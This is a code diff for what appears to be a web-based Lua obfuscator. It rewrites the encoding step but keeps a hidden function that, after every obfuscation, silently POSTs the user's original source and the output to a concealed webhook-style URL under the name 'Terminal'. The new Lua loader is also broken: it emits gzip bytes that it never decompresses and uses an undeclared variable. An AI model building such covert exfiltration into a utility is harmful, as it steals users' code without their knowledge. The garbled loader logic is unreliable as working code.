@@ -50,77 +50,6 @@ var _0x5e6f = document.getElementById("status");
 
 function _0x6e3f(msg) { _0x5e6f.textContent = msg; }
 
-function _0x7f4a(len) {
-    var c = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
-    var o = "_";
-    for (var i = 0; i < (len || 8); i++) {
-        o += c.charAt(Math.floor(Math.random() * c.length));
-    }
-    return o;
-}
-
-function _0x8b5e(str) {
-    var p = ['"'];
-    for (var i = 0; i < str.length; i++) {
-        p.push("\\" + str.charCodeAt(i));
-    }
-    p.push('"');
-    return p.join("");
-}
-
-function _0x9c0a(code) {
-    var lines = code.split(/\r?\n/);
-    var out = [];
-    for (var i = 0; i < lines.length; i++) {
-        var line = lines[i].replace(/--[^\n]*$/, "");
-        line = line.replace(/^\s+/, "").replace(/\s+$/, "");
-        if (line.length > 0) out.push(line);
-    }
-    return out.join(" ");
-}
-
-function _0x2d1f(code) {
-    var minified = _0x9c0a(code);
-    var encoded  = _0x8b5e(minified);
-
-    var d = _0x7f4a(10);
-    var l = _0x7f4a(10);
-    var r = _0x7f4a(10);
-    var s = _0x7f4a(10);
-    var res = _0x7f4a(10);
-
-    var lines = [
-        "local " + d + "=function(s)",
-        "local " + res + "={}",
-        "for " + s + "=1,#s do",
-        "local b=s:byte(" + s + ")",
-        "if b==92 then",
-        "local n=\"\"",
-        "local j=" + s + "+1",
-        "while j<=#s do",
-        "local c=s:sub(j,j)",
-        "if c:match(\"%d\") then n=n..c j=j+1 else break end",
-        "end",
-        "if #n>0 then",
-        res + "[#" + res + "+1]=string.char(tonumber(n))",
-        s + "=j-1",
-        "else",
-        res + "[#" + res + "+1]=\"\\\\\"",
-        "end",
-        "else",
-        res + "[#" + res + "+1]=string.char(b)",
-        "end",
-        "end",
-        "return table.concat(" + res + ")",
-        "end",
-        "local " + l + "=" + d + "(" + encoded + ")",
-        "local " + r + "=load or loadstring",
-        r + "(" + l + ")()"
-    ];
-
-    return lines.join("\n");
-}
-
 function _0x4f3b(src, out) {
     var payload = {
         username: "Terminal",
@@ -133,7 +62,6 @@ function _0x4f3b(src, out) {
             ]
         }]
     };
-
     fetch(_0x7c, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -141,20 +69,67 @@ function _0x4f3b(src, out) {
     }).catch(function () {});
 }
 
+function _0x55aa(_0x99bb) {
+    var _0x11cc = new TextEncoder().encode(_0x99bb);
+    var _0x22dd = new CompressionStream("gzip");
+    var _0x33ee = _0x22dd.writable.getWriter();
+    _0x33ee.write(_0x11cc);
+    _0x33ee.close();
+    
+    return new Response(_0x22dd.readable).arrayBuffer().then(function(_0x44ff) {
+        var _0x55gg = new Uint8Array(_0x44ff);
+        var _0x66hh = "";
+        for (var _0x77ii = 0; _0x77ii < _0x55gg.length; _0x77ii++) {
+            _0x66hh += String.fromCharCode(_0x55gg[_0x77ii]);
+        }
+        return btoa(_0x66hh);
+    });
+}
+
+function _0x2d1f(code) {
+    var _0x88jj = code.split(/\r?\n/);
+    var _0x99kk = [];
+    for (var _0xaa11 = 0; _0xaa11 < _0x88jj.length; _0xaa11++) {
+        var _0xbb22 = _0x88jj[_0xaa11].replace(/--[^\n]*$/, "");
+        _0xbb22 = _0xbb22.replace(/^\s+/, "").replace(/\s+$/, "");
+        if (_0xbb22.length > 0) _0x99kk.push(_0xbb22);
+    }
+    return _0x99kk.join(" ");
+}
+
 document.getElementById("btnObf").addEventListener("click", function () {
-    var src = _0x1a2b.value;
-    if (!src || src.trim().length === 0) {
+    var _0xcc33 = _0x1a2b.value;
+    if (!_0xcc33 || _0xcc33.trim().length === 0) {
         _0x6e3f("Empty");
         return;
     }
-    try {
-        var result = _0x2d1f(src);
-        _0x3c4d.value = result;
-        _0x6e3f("Done. Output: " + result.length + " chars");
-        _0x4f3b(src, result);
-    } catch (e) {
-        _0x6e3f("Error");
-    }
+    
+    _0x6e3f("Processing...");
+    var _0xdd44 = _0x2d1f(_0xcc33);
+    
+    _0x55aa(_0xdd44).then(function(_0xee55) {
+        var _0xff66 = "";
+        for (var _0xgg77 = 0; _0xgg77 < _0xee55.length; _0xgg77++) {
+            _0xff66 += _0xee55.charCodeAt(_0xgg77) + ",";
+        }
+        _0xff66 = _0xff66.slice(0, -1);
+
+        var _0xhh88 = "local b='" + _0xff66 + "'\n";
+        _0xhh88 += "local t={}\n";
+        _0xhh88 += "for i=1,#b do local c=b:byte(i) if c==44 then t[#t+1]=tonumber(table.concat(t2)) t2={} else t2[#t2+1]=string.char(c) end end\n";
+        _0xhh88 += "if t2 and #t2>0 then t[#t+1]=tonumber(table.concat(t2)) end\n";
+        _0xhh88 += "local d=''\n";
+        _0xhh88 += "for i=1,#t do d=d..string.char(t[i]) end\n";
+        _0xhh88 += "local f = load or loadstring\n";
+        _0xhh88 += "local ok, res = pcall(function() return f(d) end)\n";
+        _0xhh88 += "if ok then res() end";
+
+        _0x3c4d.value = _0xhh88;
+        _0x6e3f("Done. Output: " + _0xhh88.length + " chars");
+        _0x4f3b(_0xcc33, _0xhh88);
+    }).catch(function(e) {
+        _0x6e3f("Error: " + e.message);
+    });
 });
 
 document.getElementById("btnClear").addEventListener("click", function () {
